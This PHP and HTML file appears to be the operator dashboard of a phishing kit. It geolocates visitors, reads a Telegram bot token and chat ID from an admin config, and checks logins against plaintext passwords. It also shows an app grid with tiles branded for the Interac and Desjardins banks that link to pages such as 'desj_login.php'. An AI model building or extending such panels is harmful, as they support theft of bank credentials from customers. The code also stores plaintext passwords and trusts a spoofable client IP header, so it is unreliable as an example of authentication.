<?php


// Function to get the client's IP address
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }
    return $ipaddress;
}

// Function to increment the failed login attempts for a given IP address
function incrementFailedAttempts($ip) {
    $file = 'failed_attempts.txt';
    $failedAttempts = [];

    // Read the existing failed attempts from the file
    if (file_exists($file)) {
        $failedAttempts = json_decode(file_get_contents($file), true);
    }

    // Increment the failed attempts count for the IP address
    if (isset($failedAttempts[$ip])) {
        $failedAttempts[$ip]++;
    } else {
        $failedAttempts[$ip] = 1;
    }

    // Write the updated failed attempts back to the file
    file_put_contents($file, json_encode($failedAttempts));

    return $failedAttempts[$ip];
}

// Get the client's IP address
$PublicIP = getClientIP();

// Fetch geolocation details using IP address
$geoDetails = file_get_contents("http://ipwhois.app/json/$PublicIP");
$geoData = json_decode($geoDetails, true);

// Include configuration
$configFile = $_SERVER['DOCUMENT_ROOT'] . '/admin/config.php';
if (file_exists($configFile)) {
    $config = include($configFile);
} else {
    die("Config file not found");
}

$telegramConfig = $config['TELEGRAM_BOTS']['ADMIN'] ?? [];
$apiToken = $telegramConfig['token'] ?? '';
$chatId = $telegramConfig['chatId'] ?? '';

// Check if Telegram API token or chat ID is missing or empty
if (empty($apiToken) || empty($chatId)) {
    die("Telegram API token or chat ID is missing or empty in config.php");
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ip = $_SERVER['REMOTE_ADDR'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Load users and their login locations from the config file
    $users = $config['USERS'] ?? [];

    // Check if the username exists and the password is correct
    foreach ($users as $user => $data) {
        if ($username === $user && $password === $data['password']) {
            // Redirect to the user's specific location
            header("Location: " . $data['location']);
            exit;
        }
    }

    // Increment failed login attempts and redirect to error page
    incrementFailedAttempts($ip);
    header("Location: error_page.php?message=Invalid%20username%20or%20password");
    exit;
}
?><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>App Selection Screen with Dock</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            overflow: hidden;
        }

        .apps-container {
            display: grid;
            grid-template-columns: repeat(4, 1fr); /* Creates a 4-column grid */
            grid-template-rows: repeat(6, 1fr); /* Creates 6 rows */
            gap: 10px;
            justify-content: center;
            width: 100%; /* Adjust based on desired width, could be 90%, 80%, etc. */
            max-width: 600px; /* Adjust this to control the maximum width */
            margin-bottom: 20px;
        }

        .app {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100px; /* You might want to adjust this based on your grid */
            cursor: pointer; /* Changed from 'grab' for usability */
        }

        .app img {
            width: 80px; /* Adjust if necessary */
            height: 80px; /* Adjust if necessary */
            margin-bottom: 5px;
            border-radius: 15px;
        }

        .app-name {
            color: #FFD700;
            font-size: 14px;
            text-align: center;
        }

        .dock {
            display: flex;
            justify-content: center;
            gap: 10px;
            border-top: 2px solid #FFD700;
            padding-top: 10px;
            position: fixed; /* Makes the dock stay at the bottom */
            bottom: 20px; /* Adjust based on padding or desired distance from the bottom */
            width: 80%;
        }
    </style>
</head>
<body>

<div class="apps-container" id="appsContainer">
    <!-- Apps are inserted here dynamically -->
</div>

<div class="dock" id="dock">
    <!-- Docked apps will appear here -->
</div>
<script>
// Sample apps data with URLs
const apps = [
    { id: 'app1', name: 'app1', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTMMKVmKhCv9Pb-lfMKrV4EuzVz1RyYrj1brSwfSMpZ8BL1LazUc2WzgKPn6p1W4G0A9I&usqp=CAU', url: 'app1/index.php' },
    { id: 'Google', name: 'Google', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTMMKVmKhCv9Pb-lfMKrV4EuzVz1RyYrj1brSwfSMpZ8BL1LazUc2WzgKPn6p1W4G0A9I&usqp=CAU', url: 'app2/index.php' },
    { id: 'interac', name: 'Interac', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTMMKVmKhCv9Pb-lfMKrV4EuzVz1RyYrj1brSwfSMpZ8BL1LazUc2WzgKPn6p1W4G0A9I&usqp=CAU', url: 'app3/index.php' },
    { id: 'Settings', name: 'Settings', img: 'https://th.bing.com/th/id/OIP.8OWFRUcDiEiW9e9sa0MHqgHaG6?rs=1&pid=ImgDetMain', url: 'aedit.php' },
    
        { id: 'Desjardin', name: 'Desjardins', img: 'https://th.bing.com/th/id/R.556bb07f1b88b3d90b637bee41bfa725?rik=ZpCKy0FIwleRPA&riu=http%3a%2f%2fa3.mzstatic.com%2fus%2fr30%2fPurple%2fv4%2f46%2ff4%2faa%2f46f4aa52-ca04-ecd3-c50a-517989b6a99e%2fmzl.opdmjayw.png&ehk=Jn6UJW4waG2inAM8QRffVfTNrNulnqD1CTLG33PCURs%3d&risl=&pid=ImgRaw&r=0', url: 'desj_login.php' },

    // Add more apps with their respective URLs
];

// Initialize apps
function initApps() {
    const appsContainer = document.getElementById('appsContainer');
    apps.forEach(app => {
        const appElement = document.createElement('div');
        appElement.className = 'app';
        appElement.innerHTML = `
            <img src="${app.img}" alt="${app.name}">
            <div class="app-name">${app.name}</div>
        `;
        appElement.addEventListener('click', function() {
            window.location.href = app.url; // Redirect to the app's URL
        });
        appsContainer.appendChild(appElement);
    });
}

initApps();
</script>
</body>
</html>
